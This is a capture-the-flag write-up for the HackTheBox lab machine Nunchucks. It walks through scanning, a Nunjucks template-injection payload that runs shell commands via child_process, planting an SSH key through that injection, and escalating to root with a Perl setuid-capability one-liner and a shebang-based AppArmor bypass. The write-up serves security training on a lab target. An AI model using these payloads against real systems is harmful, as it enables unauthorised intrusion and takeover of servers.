---
title: HTB: Nunchucks
url: https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html
date: 2021-11-02T09:00:00+00:00
difficulty: Easy [20]
os: Linux
tags: hackthebox, ctf, htb-nunchucks, uhc, nmap, wfuzz, vhosts, feroxbuster, ssti, express, express-nunchucks, capabilities, gtfobins, apparmor
---

![Nunchucks](https://0xdfimages.gitlab.io/img/nunchucks-cover.png)

October’s UHC qualifying box, Nunchucks, starts with a template injection vulnerability in an Express JavaScript application. There are a lot of templating engines that Express can use, but this one is using Nunchucks. After getting a shell, there’s what looks like a simple GTFObins privesc, as the Perl binary has the setuid capability. However, AppArmor is blocking the simple exploitation, and will need to be bypassed to get a root shell.

## Box Info

| Name | [Nunchucks](https://hackthebox.com/machines/nunchucks)  [Nunchucks](https://hackthebox.com/machines/nunchucks) [Play on HackTheBox](https://hackthebox.com/machines/nunchucks) |
| --- | --- |
| Release Date | 02 Nov 2021 |
| Retire Date | 02 Nov 2021 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.122
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-22 13:44 EDT
Warning: 10.10.11.122 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.122
Host is up (0.12s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 102.82 seconds
oxdf@parrot$ nmap -p 22,80,443 -sCV -oA scans/nmap-tcpscripts 10.10.11.122
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-22 13:49 EDT
Nmap scan report for 10.10.11.122
Host is up (0.11s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Nunchucks - Landing Page
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.77 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 Focal.

The site on 80 redirects to `https://nunchucks.htb`, and the certificate on 443 also gives the same domain. I’ll add it to my `/etc/hosts` file.

### VHost Fuzz

Given the use of domain names, I’ll start `wfuzz` looking for potential subdomains. Running quickly without a filter shows that the default is 30587 bytes long, so I’ll add `--hh 30587` to the arguments and run again:

```

oxdf@parrot$ wfuzz -H "Host: FUZZ.nunchucks.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 30587 https://nunchucks.htb 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://nunchucks.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000081:   200        101 L    259 W      4028 Ch     "store"

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0

```

It finds `store.nunchucks.htb`, which I’ll add to `/etc/hosts` as well:

```
10.10.11.122 nunchucks.htb store.nunchucks.htb

```

### nunchucks.htb - TCP 443

#### Site

The page is for an online marketplace:

[![image-20211022135306770](https://0xdfimages.gitlab.io/img/image-20211022135306770.png)](https://0xdfimages.gitlab.io/img/image-20211022135306770.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20211022135306770.png)

There is an email at the bottom, `support@nunchucks.htb`.

There are links to Log In and Sign up:

![image-20211022140103728](https://0xdfimages.gitlab.io/img/image-20211022140103728.png)

![image-20211022140116492](https://0xdfimages.gitlab.io/img/image-20211022140116492.png)

I didn’t have any luck bypassing the login, and when I tried to sign up:

![image-20211022140151011](https://0xdfimages.gitlab.io/img/image-20211022140151011.png)

#### Tech Stack

Looking at the HTTP response headers, the server is running Express, a JavaScript framework:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 22 Oct 2021 18:01:56 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/"777d-t5xzWgv1iuRI5aJo57wYpq8tm5A"
Content-Length: 30589

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@parrot$ feroxbuster -u https://nunchucks.htb -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://nunchucks.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
WLD        3l        6w       45c Got 200 for https://nunchucks.htb/56132a60d50a44e8a652348a707d35e1 (url length: 32)
WLD         -         -         - Wildcard response is static; auto-filtering 45 responses; toggle this behavior by using --dont-filter
WLD        3l        6w       45c Got 200 for https://nunchucks.htb/49243936a43a4aae8c5c1f8feb994d1f0d38fc33cdd3433f9073ea6ac78f04eedf7c7330230340c7855df648a1940155 (url length: 96)
200      183l      662w     9172c https://nunchucks.htb/login
301       10l       16w      179c https://nunchucks.htb/assets
200      183l      662w     9172c https://nunchucks.htb/Login
301       10l       16w      193c https://nunchucks.htb/assets/images
301       10l       16w      185c https://nunchucks.htb/assets/js
301       10l       16w      187c https://nunchucks.htb/assets/css
200      250l     1863w    19134c https://nunchucks.htb/privacy
200      187l      683w     9488c https://nunchucks.htb/signup
200      245l     1737w    17753c https://nunchucks.htb/terms
301       10l       16w      179c https://nunchucks.htb/Assets
301       10l       16w      193c https://nunchucks.htb/Assets/images
301       10l       16w      185c https://nunchucks.htb/Assets/js
301       10l       16w      187c https://nunchucks.htb/Assets/css
200      250l     1863w    19134c https://nunchucks.htb/Privacy
200      245l     1737w    17753c https://nunchucks.htb/Terms
200      187l      683w     9488c https://nunchucks.htb/Signup
200      187l      683w     9488c https://nunchucks.htb/SignUp
200      183l      662w     9172c https://nunchucks.htb/LOGIN
[####################] - 3m    269991/269991  0s      found:20      errors:0      
[####################] - 2m     30001/29999   188/s   https://nunchucks.htb
[####################] - 2m     29999/29999   166/s   https://nunchucks.htb/assets
[####################] - 3m     29999/29999   166/s   https://nunchucks.htb/assets/images
[####################] - 3m     29999/29999   166/s   https://nunchucks.htb/assets/js
[####################] - 3m     29999/29999   166/s   https://nunchucks.htb/assets/css
[####################] - 3m     29999/29999   166/s   https://nunchucks.htb/Assets
[####################] - 3m     29999/29999   166/s   https://nunchucks.htb/Assets/images
[####################] - 3m     29999/29999   166/s   https://nunchucks.htb/Assets/js
[####################] - 3m     29999/29999   166/s   https://nunchucks.htb/Assets/css

```

Looking through these links, nothing interesting jumped out that I hadn’t looked at already.

### store.nunchucks.htb

This site is for a coming soon store:

![image-20211022140500390](https://0xdfimages.gitlab.io/img/image-20211022140500390.png)

If I enter an email address, there’s a message:

![image-20211022140558465](https://0xdfimages.gitlab.io/img/image-20211022140558465.png)

## Shell as david

### Identify SSTI / SSJSI

After wasting some time trying to get the server to connect to me, I tried a server-side template injection payload:

[![image-20211022141409231](https://0xdfimages.gitlab.io/img/image-20211022141409231.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211022141409231.png)

It worked! `{{7*7}}` became `49`.

### RCE POC

In Googling around to understand what templating engine Express uses, it turns out [it supports a lot](https://expressjs.com/en/resources/template-engines.html)! But one on the list jumped out:

![image-20211022142458105](https://0xdfimages.gitlab.io/img/image-20211022142458105.png)

When it matches the box name, that’s a good hint! Googling for “nunchucks template injection” led to [this post](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine). It shows how to build different payloads, but the last one is the most interesting as it shows code execution:

```

{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}

```

I’ll add backslashes to escape the double quotes, and add that payload to my Repeater window. It gets `/etc/passwd`:

[![image-20211022142823710](https://0xdfimages.gitlab.io/img/image-20211022142823710.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211022142823710.png)

The code execution is happening as the david user (when given `id` as the command):

![image-20211022143839505](https://0xdfimages.gitlab.io/img/image-20211022143839505.png)

### OS Exploration

I could go right for a reverse shell, but I might check if I can grab `user.txt` first.

Running `ls -l /home` shows only one user, `david`:

[![image-20211022143025654](https://0xdfimages.gitlab.io/img/image-20211022143025654.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211022143025654.png)

`user.txt` is in that directory:

[![image-20211022143101840](https://0xdfimages.gitlab.io/img/image-20211022143101840.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211022143101840.png)

And I can grab it:

[![image-20211022143201046](https://0xdfimages.gitlab.io/img/image-20211022143201046.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211022143201046.png)

### SSH Key

To get a shell, I’ll write my SSH key into `/home/david/.ssh/authorized_keys`. First create the directory:

```

{"email":"0xdf{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('mkdir /home/david/.ssh')\")()}}@htb.htb"}

```

Now add my public key:

```

{"email":"0xdf{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing > /home/david/.ssh/authorized_keys')\")()}}@htb.htb"}

```

Next set the permissions to 600:

```

{"email":"0xdf{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('chmod 600 /home/david/.ssh/authorized_keys')\")()}}@htb.htb"}

```

And now I can connect over SSH:

```

oxdf@parrot$ ssh -i ~/keys/ed25519_gen david@nunchucks.htb
...[snip]...
david@nunchucks:~$

```

## Shell as root

### Enumeration

There’s no obvious `sudo` abilities or interesting SetUID/SetGID binaries.

There is an interesting file in `/opt`:

```

david@nunchucks:/opt$ ls -l
total 8
-rwxr-xr-x 1 root root  838 Sep  1 12:53 backup.pl
drwxr-xr-x 2 root root 4096 Sep 26 01:18 web_backups

```

This file is doing a backup of the web directories into `/opt/web_backsup`:

```

#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid); 
POSIX::setuid(0); 

my $tmpdir        = "/tmp";
my $backup_main = '/var/www';
my $now = strftime("%Y-%m-%d-%s", localtime);
my $tmpbdir = "$tmpdir/backup_$now";

sub printlog
{
    print "[", strftime("%D %T", localtime), "] $_[0]\n";
}

sub archive
{
    printlog "Archiving...";
    system("/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2>/dev/null");
    printlog "Backup complete in $tmpbdir/backup_$now.tar";
}

if ($> != 0) {
    die "You must run this script as root.\n";
}

printlog "Backup starts.";
mkdir($tmpbdir);
&archive;
printlog "Moving $tmpbdir/backup_$now to /opt/web_backups";
system("/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/");
printlog "Removing temporary directory";
rmdir($tmpbdir);
printlog "Completed";

```

But since only root can write to `/opt/web_backups`, it’s using `POSIX::setuid(0)` to run as root.

To do this, it must either be SUID or have a capability. It has the `setuid` capability:

```

david@nunchucks:/opt$ which perl
/usr/bin/perl
david@nunchucks:/opt$ getcap /usr/bin/perl
/usr/bin/perl = cap_setuid+ep

```

### AppArmor

#### GTFOBins Failure

There’s an entry for this on [GTFObins](https://gtfobins.github.io/gtfobins/perl/#capabilities). I’ll just use the one liner from there:

```

david@nunchucks:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
david@nunchucks:~$ 

```

For some reason it doesn’t return a root shell.

If I try `whoami`, it does return root:

```

david@nunchucks:/etc/apparmor.d$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'
root

```

If I create a simple script in `/tmp`:

```

#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);

exec "/bin/sh"

```

When I try to pass it to `perl`, it gets an accessed denied:

```

david@nunchucks:/tmp$ perl a.pl 
Can't open perl script "a.pl": Permission denied

```

#### AppArmor Config

Apparmor is a way to define access controls much more granularly to various binaries in Linux. There are a series of binary-specific profiles in `/etc/apparmor.d`:

```

david@nunchucks:/etc/apparmor.d$ ls
abstractions  disable  force-complain  local  lsb_release  nvidia_modprobe  sbin.dhclient  tunables  usr.bin.man  usr.bin.perl  usr.sbin.ippusbxd  usr.sbin.mysqld  usr.sbin.rsyslogd  usr.sbin.tcpdump

```

There is one for `usr.bin.perl`:

```

david@nunchucks:/etc/apparmor.d$ cat usr.bin.perl 
# Last Modified: Tue Aug 31 18:25:30 2021
#include <tunables/global>

/usr/bin/perl {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/perl>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

  /usr/bin/id mrix,
  /usr/bin/ls mrix,
  /usr/bin/cat mrix,
  /usr/bin/whoami mrix,
  /opt/backup.pl mrix,
  owner /home/ r,
  owner /home/david/ r,

}

```

It’s allowed to have `seduid`, but it’s not allowed to access `/root/*`, and it’s only allowed to access a handful of files.

This config basically says it can only run a handful of binaries and the script in `/opt`. It explicitly denies access to `/root` and `/etc/shadow`.

### Bypass

[This bug](https://bugs.launchpad.net/apparmor/+bug/1911431) posted to the AppArmor devs shows that while AppArmor will protect a script run with the binary, it won’t have any impact when Perl is invoked via the SheBang.

There’s two common ways to start a script on Linux. The first is to call the interpreter (`bash`, `python`, `perl`) and then give it the script as an argument. This method will apply AppArmor protections as expected.

The other is using a [Shebang](https://en.wikipedia.org/wiki/Shebang_(Unix)) (`#!`) and setting the script itself to executable. When Linux tries to load the script as executable, that line tells it what interpreter to use. For some reason, the AppArmor developers don’t believe that the rules for the interpreter should apply there, and so they don’t.

That means if I just run `./a.pl`, it works:

```

david@nunchucks:/tmp$ ./a.pl 
# bash
root@nunchucks:/tmp#

```

Now I can grab the flag:

```

root@nunchucks:/root# cat root.txt
15684727************************

```